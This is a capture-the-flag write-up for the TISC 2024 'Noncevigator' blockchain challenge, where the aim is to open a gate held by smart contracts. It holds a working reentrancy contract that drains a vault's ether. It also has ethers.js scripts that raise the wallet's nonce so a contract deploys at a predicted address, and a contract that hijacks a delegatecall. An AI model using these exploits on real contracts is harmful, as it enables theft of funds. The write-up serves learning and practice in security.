This was my first time doing an actual blockchain challenge, with my only prior experience being a short blockchain workshop organised by Jin Kai during the Greyhats 2024 summit. However, seeing as how all the participants who had passed level 6 at that point solved the blockchain challenge rather than the cloud one, and since a cursory examination of the cloud challenge reminded me of the very difficult DevSecMeow challenge from last year's TISC, I decided to take the blockchain/rev route. Fortunately, this challenge proved to be not too difficult (for a blockchain challenge).

For most of this challenge I used Metamask and Remix IDE.

# Reentrancy attack

We have 2 contracts, Noncevigator and TravelFundvault. Looking at TravelFundvault, I was surprised to see that it was vulnerable to a reentrancy attack (the one blockchain vuln I learned during the workshop).

```solidity
contract TravelFundvault {
    mapping(address => uint256) private userBalances;

    constructor() payable {
        require(
            msg.value == 180 ether,
            "Initial funding of 180 ether required"
        );
    }

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = getUserBalance(msg.sender);
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to withdraw Ether");

        userBalances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return userBalances[_user];
    }
}
```

I wrote the following contract to drain TravelFundvault's funds

```solidity
contract MyContract {
    TravelFundvault _addr;
    uint256 internal _counter;

    constructor(address _address) payable {
        _addr = TravelFundvault(payable(_address));
        _counter = 0;
    }

    receive() external payable {
        if (_counter < 90) {
            _counter += 1;
            _addr.withdraw();
        }
    }

    function withdraw() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function solve() external {
        // you can call a function while sending ether like this!
        _addr.deposit{value: 1 ether}();
        _addr.withdraw();
    }
}
```

For some reason, the contract was erroring out whenever I tried to withdraw all 180 ether at once, so I had to deploy the contract 2 times to get all the ether.

After getting all 180 ether, I tried to call the startUnlockGate transaction:

```solidity
    function startUnlockingGate(string calldata _destination) public {
        require(treasureLocations[_destination] != address(0));
        require(msg.sender.balance >= 170 ether);

        (bool success, bytes memory retValue) = treasureLocations[_destination]
            .delegatecall(abi.encodeWithSignature("unlockgate()"));
        require(success, "Denied entry!");
        require(abi.decode(retValue, (bool)), "Cannot unlock gate!");
    }
```

Unfortunately, this transaction fails for an unknown reason. The unlockgate function isn't defined anywhere, and neither are the contracts for each location. I initially assumed that at each location address, there was a contract deployed but the implementation details were hidden from us, thus some checks in unlockgate were failing.

# Guessing the nonce

I read the challenge description again: 'to access the treasure, you must navigate to the correct location and possess the correct value of the “number used only once”. A nonce is the number of transactions of a wallet or contract. So perhaps the unlockgate function is checking for a certain nonce?

I wrote a script using ethers.js which increments the nonce and calls startUnlockingGate() after each increment. (Note: I realised after some debugging that this chal's blockchain network doesn't handle multiple 'commands' in one request, so we have to pass `batchMaxCount: 1`)

```javascript:brute-forcer.js
const { ethers } = require('ethers');

const abi = ... // Noncevigator contract abi, copied from artifacts/Noncevigator.json in remix

(async function main() {
    const providerUrl = "http://chals.tisc24.ctf.sg:47156/43164f17-aa23-43f4-a8ed-0f18d92f2d43"; // Replace with your provider URL
    const privateKey = "0x3e799a9d2ac9bc1ac55a8cc8632a2116f6846ded1e0c2d09498bb8e6be639200"; // Replace with your wallet's private key
    const contractAddress = "0xE622fc03CfC51E0fC737365FeF09C951a339bb21"; // Replace with your contract's address


    const provider = new ethers.JsonRpcProvider(providerUrl, ethers.Network.from({name: 'tisc l6b', chainId: 1337}), { batchMaxCount: 1, staticNetwork: true });

    const wallet = new ethers.Wallet(privateKey, provider);
    console.log(await wallet.getNonce());

    const contract = new ethers.Contract(contractAddress, abi, wallet);

    for (let i = 0; i < 2000; i++) {
        try {
            const origNonce = await wallet.getNonce();
            console.log('running transaction: ' + i + ', nonce: ' + origNonce);
            const res = await contract.getTreasureLocation('pulauSemakau');
            while ((await wallet.getNonce()) == origNonce) {
                await new Promise(resolve => setTimeout(resolve, 100));
            }

            try {
                const res2 = await contract.startUnlockingGate('pulauSemakau');
                console.log('success!');
                console.log(res2);
                break;
            } catch (err) {
                if (err.error != null && err.error.message === 'invalid uuid specified') {
                    console.log('server must have stopped');
                    console.log(err);
                    break;
                }
            }

            console.log(`Transaction ${i + 1}/2000 complete:`, res.hash);
        } catch (err) {
            console.error(`Error in transaction ${i + 1}:`, err);
        }
    }
})();
```

Unfortunately, this was a dead end and none of the startUnlockingGate transactions succeeded. I had to try something else.

# Reversing bytecode?

After googling, I realised that it's possible to retrieve the bytecode of a contract from its address. Maybe we have to reverse the unlockgate function and figure out what nonce it's checking for. I used the following python script:

```python:h.py
from web3 import Web3

rpc_url = 'http://chals.tisc24.ctf.sg:47156/43164f17-aa23-43f4-a8ed-0f18d92f2d43'
web3 = Web3(Web3.HTTPProvider(rpc_url))

contract_address = "0xBe73bAC98415d3EC343BBe52a88644f827C21EFE"
contract_bytecode = web3.eth.get_code(contract_address).hex()
print(f"Contract Bytecode: {contract_bytecode}")
```

I tried running this with the address of the Noncevigator and TravelFundvault contracts and sure enough, the bytecode was printed. But when I ran the code with pulauSemakau's address, an empty byte string was returned, much to my bewilderment.

Eventually I realised that there wasn't actually a contract at that address; it was just pointing to nothing. But could we deploy a contract to that specific address, which implements unlockgate?

# Final solution

Googling reveals that the address of a contract is determined by the creator's address and nonce. I wrote the following script (using ethers.js, modified from the above script) to check what is the value of nonce required to deploy the contract at pulauSemakau's address.

```javascript
...

  let nonce;
  for (nonce = 0; nonce < 2000; nonce++) {
    const anticipatedAddress = ethers.utils.getContractAddress({
      from: wallet.address,
      nonce,
    });
    if (anticipatedAddress === targetAddress) {
      break;
    }
  }
  console.log('required nonce:' + nonce);
```

This printed out a rather low number, around 30-40. So we can easily deploy a contract at this address.

Taking another look at startUnlockingGate shows that unlockgate is called with `delegatecall`. I read [this example](https://solidity-by-example.org/delegatecall/) which shows delegatecall allows the callee to access and modify the properties in the calling contract.

Putting all this together, I extended the script to run the requisite number of transactions so that the next contract deployment would be placed at the desired address.

```javascript:getCorrectNonce.js
const { ethers } = require('ethers')

const abi = ... // Noncevigator contract abi, copied from artifacts/Noncevigator.json in remix

(async function getCorrectNonce() {
  const providerUrl = 'http://chals.tisc24.ctf.sg:47156/4b9d2cc3-bf30-4d9b-92ea-94e3e1c89d58';
  const privateKey = '0xec79e33eb5b2fad9aa9399a1316cfb007a78a1ba168add09172e59944b4d8bfd';
  const contractAddress = '0x07943A109602236A4942e34f4F082d2b6A8B974B';
  const targetAddress = '0x7d3eF26175F6483947941A3F6E74b7670bB5baF6';

  const provider = new ethers.providers.JsonRpcProvider(
    providerUrl,
    { name: 'tisc l6b', chainId: 1337 },
    {
      batchMaxCount: 1,
      staticNetwork: true,
    }
  );

  const wallet = new ethers.Wallet(privateKey, provider);
  let nonce;
  for (nonce = 0; nonce < 2000; nonce++) {
    const anticipatedAddress = ethers.utils.getContractAddress({
      from: wallet.address,
      nonce,
    });
    if (anticipatedAddress === targetAddress) {
      break;
    }
  }
  console.log('required nonce:' + nonce);
  const origNonce = await wallet.getTransactionCount();
  const contract = new ethers.Contract(contractAddress, abi, wallet);
  for (let i = 0; i < nonce - origNonce; i++) {
    try {
      await contract.getTreasureLocation('pulauSemakau');
      console.log(`Transaction ${i + 1} complete`);
    } catch (err) {
      console.error(`Error in transaction ${i + 1}:`, err);
    }
  }
  while ((await wallet.getTransactionCount()) < nonce) {
    await new Promise((resolve) => setTimeout(resolve, 100));
  }

  console.log('nonce is now as required: ' + nonce);

  return;
})();
```

I also wrote a contract that extends Noncevigator:

```solidity
contract Noncevigator2 {
    ... same code copied from Noncevigator ...

    function unlockgate() public {
        isLocationOpen["pulauSemakau"] = true;
    }
}
```

I deployed this contract after running `getCorrectNonce.js`, and sure enough it was at the correct address. Now calling `startUnlockingGate()` succeeds! Checking the isSolved property shows we have solved the challenge!

![](/noncevigator_solve.jpeg)

I returned to the network instancer and obtained the flag:

`TISC{ReeN7r4NCY_4ND_deTerminI5TIc_aDDReSs}`